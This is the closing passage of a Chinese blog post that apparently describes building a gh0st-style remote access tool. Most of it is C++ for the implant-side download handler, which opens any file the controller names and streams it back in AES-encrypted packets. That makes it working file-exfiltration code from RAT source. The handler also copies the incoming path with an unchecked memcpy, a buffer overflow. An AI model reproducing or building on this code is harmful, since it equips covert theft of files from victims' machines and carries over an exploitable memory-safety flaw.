最后我还是选择了原有的方案：复用之前的封包框架，手动将文件分片，然后组成封包，加密后传给另一端。由于我这个是AES-128-CFB加密的，所以速度肯定比不过压缩后无加密直接传输的gh0st。

最大测试的文件是4.3GB，传输有点慢，不过最后md5算了下，文件完整性是没问题的。

```c++
BOOL WINAPI OnRecvPacketFileDownloadInfo(LPVOID lParam) {
	THREAD_PARAM* pThreadParam = (THREAD_PARAM*)lParam;
	CPacket* pPacket = pThreadParam->m_pPacket;
	CModuleFileDownload* pModuleFileDownload = pThreadParam->m_pModuleFileDownload;
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;

	// 接收到了主控端发来的INFO封包，包体：主控端请求下载的被控端文件的路径（MAX_PATH*2 字节）
	WCHAR pszLocalPath[MAX_PATH];
	memcpy(pModuleFileDownload->m_pszLocalPath, pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);

	if (lParam != nullptr) {
		delete lParam;
		lParam = nullptr;
	}

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}

	// 只有文件存在才打开文件
	pModuleFileDownload->m_hFile = CreateFile(pModuleFileDownload->m_pszLocalPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// 打开失败
	if (pModuleFileDownload->m_hFile == INVALID_HANDLE_VALUE) {
		// 被控端发往主控端的INFO包体：被控端文件状态（1字节）+ 文件大小（8字节）
		BYTE pbPacketBody[9];
		// TODO 暂时文件打开失败统一状态为0xff, 后续可能会区分文件不存在，文件被占用等不同状态(用GetLastError来实现)
		pbPacketBody[0] = 0xff;			// 0xff表示文件打开失败
		WriteQwordToBuffer(pbPacketBody, 0, 1);
		pSocketClient->SendPacket(FILE_DOWNLOAD_INFO, pbPacketBody, 9);

		pModuleFileDownload->m_hFile = nullptr;
		return false;
	}

	// 获取文件大小
	QWORD qwFileSize = 0;
	DWORD dwFileSizeLowDword = 0;
	DWORD dwFileSizeHighDword = 0;
	dwFileSizeLowDword = GetFileSize(pModuleFileDownload->m_hFile, &dwFileSizeHighDword);
	qwFileSize = (((QWORD)dwFileSizeHighDword) << 32) + dwFileSizeLowDword;

	// 被控端发往主控端的INFO包体：被控端文件状态（1字节）+ 文件大小（8字节）
	BYTE pbPacketBody[9];
	ZeroMemory(pbPacketBody, sizeof(pbPacketBody));
	pbPacketBody[0] = 0;			// 0表示文件打开成功
	WriteQwordToBuffer(pbPacketBody, qwFileSize, 1);

	// 发回FILE_DOWNLOAD_INFO包
	pSocketClient->SendPacket(FILE_DOWNLOAD_INFO, pbPacketBody, 9);


	PBYTE pbBuffer = new BYTE[PACKET_BODY_MAX_LENGTH];
	DWORD dwPacketSplitNum = (qwFileSize % PACKET_BODY_MAX_LENGTH) ? qwFileSize / PACKET_BODY_MAX_LENGTH + 1 : qwFileSize / PACKET_BODY_MAX_LENGTH;
	DWORD dwBytesReadTemp = 0;

	// 上传文件数据
	for (DWORD dwSplitIndex = 0; dwSplitIndex < dwPacketSplitNum; dwSplitIndex++) {

		// 不是最后一个分片
		if (dwSplitIndex != dwPacketSplitNum - 1) {
			ReadFile(pModuleFileDownload->m_hFile, pbBuffer, PACKET_BODY_MAX_LENGTH, &dwBytesReadTemp, NULL);
			pSocketClient->SendPacket(FILE_DOWNLOAD_DATA, pbBuffer, PACKET_BODY_MAX_LENGTH);
		}
		// 最后一个分片
		else {
			DWORD dwReadBytes = qwFileSize % PACKET_BODY_MAX_LENGTH ? qwFileSize % PACKET_BODY_MAX_LENGTH : PACKET_BODY_MAX_LENGTH;
			ReadFile(pModuleFileDownload->m_hFile, pbBuffer, dwReadBytes, &dwBytesReadTemp, NULL);
			pSocketClient->SendPacket(FILE_DOWNLOAD_DATA_TAIL, pbBuffer, dwReadBytes);
		}
		dwBytesReadTemp = 0;
	}
	
	if (pModuleFileDownload->m_hFile != nullptr) {
		CloseHandle(pModuleFileDownload->m_hFile);
		pModuleFileDownload->m_hFile = nullptr;
	}
	

	if (pbBuffer != nullptr) {
		delete[] pbBuffer;
		pbBuffer = nullptr;
	}

	pSocketClient->SendPacket(FILE_DOWNLOAD_CLOSE, NULL, 0);

	WaitForSingleObject(pModuleFileDownload->m_hRecvPacketFileDownloadCloseEvent, INFINITE);

	if (pModuleFileDownload != nullptr) {
		delete pModuleFileDownload;
		pModuleFileDownload = nullptr;
	}

	return true;
}
```

## 结束语

本文主要说了些思路，很多具体的实现没有深入说明，具体的可以去源码中看。

水平有限，请师傅们批评指正。

![1](http://image.iyzyi.com/img/20210303112452.gif)

